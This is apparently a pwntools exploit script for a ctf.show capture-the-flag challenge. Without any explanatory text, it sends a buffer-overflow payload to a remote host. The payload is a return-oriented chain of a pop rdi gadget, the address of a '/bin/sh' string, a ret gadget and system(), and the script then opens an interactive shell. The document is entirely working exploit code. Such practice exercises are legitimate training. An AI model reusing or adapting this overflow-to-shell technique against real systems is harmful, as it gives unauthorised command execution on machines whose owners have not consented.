from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28194)
elf = ELF('./pwn')
system = elf.sym['system']
bin_sh = 0x400808
pop_rdi = 0x4007e3  # 0x00000000004007e3 : pop rdi ; ret
ret = 0x4004fe      # 0x00000000004004fe : ret 
payload = 'a'*(0xA+8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
io.sendline(payload)
io.recv()
io.interactive()
